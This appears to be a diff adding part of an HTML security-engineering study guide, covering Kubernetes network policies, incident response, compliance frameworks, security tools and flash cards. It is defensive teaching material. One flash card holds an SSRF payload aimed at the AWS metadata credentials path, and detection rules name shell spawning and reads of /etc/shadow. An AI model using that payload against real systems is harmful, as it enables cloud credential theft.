+      <p class="body"><strong>K8s RBAC</strong> controls what the Kubernetes API can be called by which service accounts. Default service accounts have no permissions — explicitly grant only what's needed. A pod that can list all secrets in all namespaces (<code>get secrets</code> with no namespace restriction) can access every secret in the cluster.</p>
+      <p class="body"><strong>NetworkPolicy</strong> is the K8s firewall. By default, all pods can reach all pods across all namespaces. A NetworkPolicy with no podSelector and no egress/ingress rules blocks all traffic to the selected pods. Start with a default-deny-all NetworkPolicy per namespace, then add specific allow rules.</p>
+
+      <div class="code-wrap">
+        <div class="code-head"><span class="code-lang">yaml — default deny all + targeted allow</span><button class="copy-btn">copy</button></div>
+        <pre><span class="tc"># Step 1: Deny all ingress and egress in a namespace</span>
+<span class="tk">apiVersion</span>: networking.k8s.io/v1
+<span class="tk">kind</span>: NetworkPolicy
+<span class="tk">metadata</span>:
+  name: default-deny-all
+  namespace: production
+<span class="tk">spec</span>:
+  podSelector: {}   <span class="tc"># applies to all pods</span>
+  policyTypes: [Ingress, Egress]
+  <span class="tc"># no ingress/egress rules = deny all</span>
+---
+<span class="tc"># Step 2: Allow notification-service to receive from API gateway only</span>
+<span class="tk">apiVersion</span>: networking.k8s.io/v1
+<span class="tk">kind</span>: NetworkPolicy
+<span class="tk">metadata</span>:
+  name: allow-notification-ingress
+  namespace: production
+<span class="tk">spec</span>:
+  podSelector:
+    matchLabels:
+      app: notification-service
+  policyTypes: [Ingress]
+  ingress:
+  - from:
+    - podSelector:
+        matchLabels:
+          app: api-gateway
+    ports:
+    - port: <span class="tn">8080</span></pre>
+      </div>
+
+      <h3 class="sub">Supply Chain Security in K8s</h3>
+      <p class="body"><strong>Image signing (cosign/Sigstore):</strong> sign container images with a private key at build time, verify signatures at deploy time using an admission webhook. Prevents deploying unsigned or tampered images.</p>
+      <p class="body"><strong>OPA/Gatekeeper (Policy as Code):</strong> admission controller that evaluates Rego policies before allowing resource creation. Policies: no containers with <code>privileged: true</code>, no images from unregistered registries, all deployments must have resource limits, no <code>latest</code> tag allowed.</p>
+      <p class="body"><strong>Falco (Runtime Security):</strong> monitors kernel syscalls and Kubernetes audit events for suspicious behaviour at runtime. Rules: container spawning a shell, writing to a sensitive directory (/etc, /usr/bin), making outbound network connections from a service that never should, reading /etc/shadow.</p>
+    </div>
+
+    <!-- 10 INCIDENT RESPONSE -->
+    <div id="incident" class="sec">
+      <div class="sec-head"><span class="sec-num">10</span><h2 class="sec-title">Incident Response</h2></div>
+
+      <p class="body">Incident response is a structured process for detecting, containing, eradicating, and recovering from security incidents. The quality of your IR plan is tested at 2AM when an alert fires — not the day you write it.</p>
+
+      <h3 class="sub">The IR Lifecycle</h3>
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Phase</th><th>Goal</th><th>Key actions</th></tr></thead>
+          <tbody>
+            <tr><td>Preparation</td><td>Ready before incident occurs</td><td>Runbooks, contact lists, access to IR tools, tabletop exercises, log retention configured</td></tr>
+            <tr><td>Detection &amp; Analysis</td><td>Confirm and scope the incident</td><td>Alert fires → triage → determine: what was accessed, by whom, for how long, what data</td></tr>
+            <tr><td>Containment</td><td>Stop the bleeding — limit blast radius</td><td>Isolate affected systems, rotate compromised credentials, block malicious IPs, preserve evidence</td></tr>
+            <tr><td>Eradication</td><td>Remove the threat from the environment</td><td>Remove malware, close vulnerability, revoke attacker access, verify no persistence mechanisms remain</td></tr>
+            <tr><td>Recovery</td><td>Restore normal operations safely</td><td>Restore from clean backups, verify integrity, monitor for reinfection</td></tr>
+            <tr><td>Post-incident review</td><td>Learn and improve</td><td>Timeline of events, root cause analysis, what worked, what didn't, control improvements</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">Forensic Preservation</h3>
+      <p class="body">Before making any changes to a compromised system, preserve evidence. The order of volatility (most to least volatile): CPU registers and cache, running processes and network connections, memory (RAM), disk, logs, backups. Capture in this order.</p>
+      <p class="body"><strong>Do not:</strong> reboot the system (clears RAM, process table), run antivirus on the live system (modifies files), change the system clock, install tools on the compromised system. <strong>Do:</strong> take a memory dump, capture running process list and network connections, take a disk image before remediation.</p>
+
+      <h3 class="sub">Key Indicators of Compromise (IOCs)</h3>
+      <p class="body">Unusual outbound connections (beacon traffic to C2 servers — regular check-ins at fixed intervals), unexpected processes (cron jobs, systemd services, processes running from /tmp), new accounts or SSH keys added, unusual network scanning or privilege escalation attempts, large data transfers out of the environment, anomalous CloudTrail activity (new IAM users, policy changes, data exfiltration from S3).</p>
+
+      <h3 class="sub">SIEM and Detection Engineering</h3>
+      <p class="body">A SIEM (Security Information and Event Management) collects and correlates logs from across the environment. Splunk, Elastic SIEM, and Microsoft Sentinel are common. Detection quality depends entirely on your detection rules — a SIEM with no rules is just an expensive log aggregator.</p>
+      <p class="body"><strong>Detection rule example (Sigma format):</strong> "Alert when a process in a K8s container spawns a shell." This rule fires on any <code>execve</code> syscall for bash, sh, or zsh from a containerised process. 99% of containers should never spawn a shell in production — this is a near-zero false positive rule.</p>
+    </div>
+
+    <!-- 11 COMPLIANCE -->
+    <div id="compliance" class="sec">
+      <div class="sec-head"><span class="sec-num">11</span><h2 class="sec-title">Compliance Frameworks</h2></div>
+
+      <p class="body">Compliance is not security. A system can be compliant and insecure (checkbox compliance). A system can be secure and not compliant (good practices that don't map to the framework). The goal is security; compliance is an audit of a subset of your security controls.</p>
+
+      <div class="tbl-wrap">
+        <table>
+          <thead><tr><th>Framework</th><th>Scope</th><th>Key requirements for engineers</th></tr></thead>
+          <tbody>
+            <tr><td>SOC 2 Type II</td><td>SaaS, cloud services</td><td>Access controls, encryption at rest/transit, audit logging, incident response plan, vendor management, change management with approvals. Type II = audited over 6-12 months (not just a point-in-time snapshot).</td></tr>
+            <tr><td>PCI-DSS v4</td><td>Payment card data</td><td>No storing CVV, encrypted CHD, network segmentation of CDE, WAF required, penetration testing annually, MFA for all admin access, no default passwords, quarterly vulnerability scans.</td></tr>
+            <tr><td>HIPAA</td><td>US healthcare data (PHI)</td><td>Access controls and audit logs on all PHI, encryption of PHI at rest and in transit, business associate agreements with vendors, breach notification within 60 days, minimum necessary access principle.</td></tr>
+            <tr><td>GDPR</td><td>EU personal data</td><td>Lawful basis for processing, data minimisation, right to erasure (delete user data on request), data breach notification within 72 hours, DPIAs for high-risk processing, no transfer to non-adequate countries without safeguards.</td></tr>
+            <tr><td>ISO 27001</td><td>Information security management</td><td>Risk assessment and treatment, asset management, access control policy, cryptographic policy, incident management, supplier security, business continuity. Annex A: 93 controls across 4 categories.</td></tr>
+            <tr><td>NIST CSF 2.0</td><td>Cybersecurity risk management</td><td>Six functions: Govern, Identify, Protect, Detect, Respond, Recover. Framework for organising security programs. Not a compliance standard — a risk management framework. Widely used in US federal and critical infrastructure.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <h3 class="sub">Data Classification</h3>
+      <p class="body">Not all data needs the same controls. A classification system lets you apply controls proportionally to risk.</p>
+      <p class="body"><strong>Public:</strong> freely available, no harm if disclosed. Marketing materials, public docs.</p>
+      <p class="body"><strong>Internal:</strong> not harmful if disclosed but not meant to be public. Internal documentation, team plans.</p>
+      <p class="body"><strong>Confidential:</strong> would cause harm if disclosed. Source code, internal financial data, business strategy. Encrypt at rest, audit access, need-to-know principle.</p>
+      <p class="body"><strong>Restricted:</strong> would cause significant harm if disclosed. PII, payment card data, health records, credentials, cryptographic keys. Encrypt at rest with dedicated KMS, strict access control, DLP monitoring, mandatory logging of all access.</p>
+    </div>
+
+    <!-- 12 TOOLS -->
+    <div id="tools" class="sec">
+      <div class="sec-head"><span class="sec-num">12</span><h2 class="sec-title">Security Tools Reference</h2></div>
+
+      <h3 class="sub">Scanning and Discovery</h3>
+      <div class="tool-row">
+        <span class="tool-pill">nmap — port scanning, service detection</span>
+        <span class="tool-pill">masscan — fast internet-wide port scanning</span>
+        <span class="tool-pill">nuclei — vulnerability scanning with templates</span>
+        <span class="tool-pill">shodan — search engine for internet-exposed services</span>
+        <span class="tool-pill">amass — subdomain enumeration</span>
+        <span class="tool-pill">subfinder — passive subdomain discovery</span>
+      </div>
+
+      <h3 class="sub">Web Application Testing</h3>
+      <div class="tool-row">
+        <span class="tool-pill">Burp Suite — intercept, modify, replay HTTP requests</span>
+        <span class="tool-pill">OWASP ZAP — open-source web scanner</span>
+        <span class="tool-pill">sqlmap — automated SQL injection detection</span>
+        <span class="tool-pill">ffuf — web fuzzer for endpoints, parameters</span>
+        <span class="tool-pill">dalfox — XSS scanner</span>
+        <span class="tool-pill">nikto — web server scanner</span>
+      </div>
+
+      <h3 class="sub">Secrets Scanning</h3>
+      <div class="tool-row">
+        <span class="tool-pill">truffleHog — scan git history for secrets</span>
+        <span class="tool-pill">gitleaks — git secrets scanner, pre-commit hook</span>
+        <span class="tool-pill">detect-secrets — Yelp's secret detection, baseline-based</span>
+        <span class="tool-pill">semgrep — SAST with security rules</span>
+      </div>
+
+      <h3 class="sub">Cloud Security</h3>
+      <div class="tool-row">
+        <span class="tool-pill">prowler — AWS/GCP/Azure security audit</span>
+        <span class="tool-pill">ScoutSuite — cloud security auditing tool</span>
+        <span class="tool-pill">CloudMapper — AWS network visualisation</span>
+        <span class="tool-pill">Pacu — AWS exploitation framework (pen test)</span>
+        <span class="tool-pill">checkov — IaC security scanner (Terraform, K8s YAML)</span>
+        <span class="tool-pill">tfsec — Terraform static analysis</span>
+      </div>
+
+      <h3 class="sub">Container and K8s</h3>
+      <div class="tool-row">
+        <span class="tool-pill">trivy — container image vulnerability scanner</span>
+        <span class="tool-pill">grype — container image CVE scanner</span>
+        <span class="tool-pill">falco — K8s runtime security</span>
+        <span class="tool-pill">kube-bench — CIS K8s benchmark checker</span>
+        <span class="tool-pill">kube-hunter — K8s penetration testing</span>
+        <span class="tool-pill">kubesec — K8s manifest security scoring</span>
+        <span class="tool-pill">cosign — container image signing (Sigstore)</span>
+      </div>
+
+      <h3 class="sub">Network</h3>
+      <div class="tool-row">
+        <span class="tool-pill">Wireshark — packet capture and analysis</span>
+        <span class="tool-pill">tcpdump — CLI packet capture</span>
+        <span class="tool-pill">nessus — vulnerability scanner</span>
+        <span class="tool-pill">metasploit — exploitation framework</span>
+        <span class="tool-pill">responder — LLMNR/NBT-NS/MDNS poisoning</span>
+        <span class="tool-pill">impacket — network protocol implementations</span>
+      </div>
+
+      <h3 class="sub">Cryptographic Utilities</h3>
+      <div class="tool-row">
+        <span class="tool-pill">openssl — TLS certs, key generation, encryption</span>
+        <span class="tool-pill">cfssl — CloudFlare's PKI toolkit</span>
+        <span class="tool-pill">step-cli — ACME, certificate management</span>
+        <span class="tool-pill">age — modern file encryption (X25519, scrypt)</span>
+        <span class="tool-pill">sops — encrypted secrets in YAML/JSON for GitOps</span>
+      </div>
+
+      <h3 class="sub">Essential Commands</h3>
+      <div class="code-wrap">
+        <div class="code-head"><span class="code-lang">shell — security diagnostic commands</span><button class="copy-btn">copy</button></div>
+        <pre><span class="tc"># Inspect a TLS certificate</span>
+openssl s_client -connect example.com:<span class="tn">443</span> -servername example.com 2>/dev/null \
+  | openssl x509 -noout -text | grep -E <span class="ts">"Subject:|Issuer:|Not |SAN|DNS"</span>
+
+<span class="tc"># Check certificate expiry in seconds (alert if < 30 days)</span>
+openssl s_client -connect example.com:<span class="tn">443</span> 2>/dev/null \
+  | openssl x509 -noout -enddate
+
+<span class="tc"># Generate a random 256-bit secret (base64 encoded)</span>
+openssl rand -base64 <span class="tn">32</span>
+
+<span class="tc"># Hash a password with Argon2id (requires libsodium)</span>
+echo -n <span class="ts">"my_password"</span> | argon2 $(openssl rand -base64 <span class="tn">16</span>) -id -t <span class="tn">3</span> -m <span class="tn">65536</span> -p <span class="tn">4</span>
+
+<span class="tc"># Scan a container image for vulnerabilities</span>
+trivy image --severity HIGH,CRITICAL myapp:latest
+
+<span class="tc"># Scan a K8s manifest for security issues</span>
+kubesec scan deployment.yaml
+
+<span class="tc"># Check AWS IAM effective permissions for a role</span>
+aws iam simulate-principal-policy \
+  --policy-source-arn arn:aws:iam::123456789:role/notification-service \
+  --action-names s3:GetObject s3:DeleteObject \
+  --resource-arns arn:aws:s3:::my-bucket/*
+
+<span class="tc"># Scan git history for secrets</span>
+trufflehog git file://. --only-verified
+
+<span class="tc"># Check TLS configuration and grade (equivalent to SSL Labs)</span>
+testssl.sh --full --color 3 https://example.com</pre>
+      </div>
+    </div>
+
+    <!-- FLASH CARDS -->
+    <div id="flashcards" class="sec">
+      <div class="sec-head"><span class="sec-num">→</span><h2 class="sec-title">Flash Cards</h2></div>
+      <p class="body" style="margin-bottom:20px">Close your notes. Answer each from memory before looking at the answer.</p>
+
+      <div class="fc-grid">
+        <div class="fc">
+          <div class="fc-q">AES-256-GCM vs AES-256-CBC — when would you use each?</div>
+          <div class="fc-a">GCM provides authenticated encryption (confidentiality + integrity in one pass) — use for almost everything. CBC provides only confidentiality — must be combined with HMAC (Encrypt-then-MAC pattern). GCM is preferred for new systems. CBC is acceptable only in legacy contexts where GCM isn't available.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">Why is MD5 broken and can you still use it for anything?</div>
+          <div class="fc-a">MD5 is collision-broken: two different inputs can produce the same hash. This breaks any security use (digital signatures, certificate fingerprints, password hashing). Acceptable only for non-security checksums where collision resistance doesn't matter (file deduplication, content-addressable caching).</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">What is forward secrecy and why does TLS 1.3 provide it?</div>
+          <div class="fc-a">Forward secrecy means a compromise of the server's long-term private key does not decrypt past recorded sessions. TLS 1.3 uses ECDHE (ephemeral Diffie-Hellman) — a fresh key pair is generated for each session. The session key is never transmitted; both sides derive it from the ephemeral keys. Compromising the static private key only lets you impersonate the server in future, not decrypt past traffic.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">What is IDOR and what's the correct fix?</div>
+          <div class="fc-a">Insecure Direct Object Reference: accessing another user's resource by changing an ID in the request (GET /invoice/1043 returns another user's invoice). The fix: every DB query for user-owned data must include the requesting user's ID in the WHERE clause. Route-level authentication is insufficient — you need object-level authorisation on every data access.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">Stored XSS vs reflected XSS — which is more dangerous and why?</div>
+          <div class="fc-a">Stored XSS is more dangerous. The malicious payload is stored in the database and executes for every user who views the affected content — no user interaction required beyond normal browsing. Reflected XSS requires tricking a victim into clicking a malicious link. A stored XSS in a comment system could compromise every logged-in user's account automatically.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">Why is <code>==</code> unsafe for comparing HMACs? What's the attack?</div>
+          <div class="fc-a">Standard string comparison short-circuits on the first mismatching byte — the time to return varies with how many bytes match. An attacker can send 10,000 requests per guess, measuring response time to determine how many bytes of their guess are correct, extracting the HMAC one byte at a time. Fix: <code>hmac.Equal()</code> in Go or <code>hmac.compare_digest()</code> in Python — constant-time regardless of where comparison fails.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">What is SSRF? What's the AWS-specific attack payload?</div>
+          <div class="fc-a">SSRF: the server fetches a URL supplied by the user. Attacker supplies <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name</code> — in AWS this returns the EC2 instance's temporary IAM credentials. Fix: validate/allowlist URLs, block RFC 1918 and link-local ranges, enforce IMDSv2 (requires token exchange, not directly exploitable by naive SSRF).</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">Argon2id vs bcrypt — why is Argon2id better for passwords?</div>
+          <div class="fc-a">Argon2id is memory-hard — it requires a configurable amount of RAM per hash attempt. This makes GPU and ASIC cracking attacks much more expensive (GPUs have limited RAM bandwidth). bcrypt is CPU-hard but not memory-hard — modern GPUs can compute many bcrypt hashes in parallel. Argon2id won the Password Hashing Competition (2015). Use Argon2id for new systems; bcrypt is still acceptable legacy.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">CSRF vs XSS — what's the difference in how they work?</div>
+          <div class="fc-a">CSRF exploits the browser's automatic cookie attachment: attacker makes the victim's browser send a legitimate-looking request to a target site. The attack is in the request origin. XSS injects malicious scripts into a target site that execute in the victim's browser with the site's privileges. The attack is in the response content. SameSite cookies fix CSRF. Content encoding/CSP fix XSS.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">What is a supply chain attack? Name two real examples.</div>
+          <div class="fc-a">Attacking software by compromising a trusted dependency rather than the target directly. SolarWinds (2020): malicious code inserted into the build pipeline, distributed as a legitimate update to 18,000+ organisations. XZ Utils (2024): two years of social engineering to gain maintainer access to a Linux compression library, then a backdoor inserted. Mitigations: pin dependencies to cryptographic hashes, verify signatures, audit new dependencies.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">What is the JWT algorithm confusion attack?</div>
+          <div class="fc-a">Server uses RS256 (asymmetric — verifies with public key). Attacker changes the JWT header to HS256 (symmetric — verifies with a shared secret) and signs the token with the server's public key, which is public knowledge. Vulnerable libraries use the algorithm from the header to decide which key to verify with — they verify the HMAC using the public key and it passes. Fix: enforce the expected algorithm; never trust the algorithm field from the token header.</div>
+        </div>
+        <div class="fc">
+          <div class="fc-q">In K8s, what does setting allowPrivilegeEscalation: false actually prevent?</div>
+          <div class="fc-a">It prevents the process inside the container from gaining more Linux capabilities than it started with — specifically, it prevents setuid/setgid executables from running with elevated permissions, and prevents calls to <code>prctl(PR_SET_DUMPABLE)</code>. Without this, even a non-root process could execute a setuid binary (like <code>sudo</code>) to gain root. Combined with <code>capabilities: drop: ALL</code> and <code>runAsNonRoot: true</code>, it forms the core of container hardening.</div>
+        </div>
+      </div>
+    </div>
+
+  </article>
+</div>
+</div>
+
+<div class="wrap">
+<footer style="border-top:1px solid var(--rule);padding:28px 0">
+  <div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px">
+    <div style="font-family:var(--mono);font-size:11px;color:var(--ink-4)">Engineering OS · <a href="index.html" style="color:var(--ink-3);text-decoration:none">← Platform</a></div>
+    <div style="font-family:var(--mono);font-size:11px;color:var(--ink-4)">Saurabh S. Patel · 2026</div>
+  </div>
+</footer>
+</div>
+
+<script>
+function toggleAtk(head) {
+  head.closest('.atk').classList.toggle('open');
+}
+document.querySelectorAll('.copy-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const pre = btn.closest('.code-wrap').querySelector('pre');
+    navigator.clipboard.writeText(pre.innerText).then(() => {
+      btn.textContent = 'copied';
+      setTimeout(() => btn.textContent = 'copy', 1500);
+    });
+  });
+});
+const secs = document.querySelectorAll('[id]');
+const tl = document.querySelectorAll('.toc-item');
+const ob = new IntersectionObserver(entries => {
+  entries.forEach(e => {
+    if (e.isIntersecting) {
+      tl.forEach(l => l.classList.remove('active'));
+      const a = document.querySelector(`.toc-item a[href="#${e.target.id}"]`);
+      if (a) a.closest('.toc-item').classList.add('active');
+    }
+  });
+}, { rootMargin: '-20% 0px -70% 0px' });
+secs.forEach(s => ob.observe(s));
+</script>
+</body>
+</html>
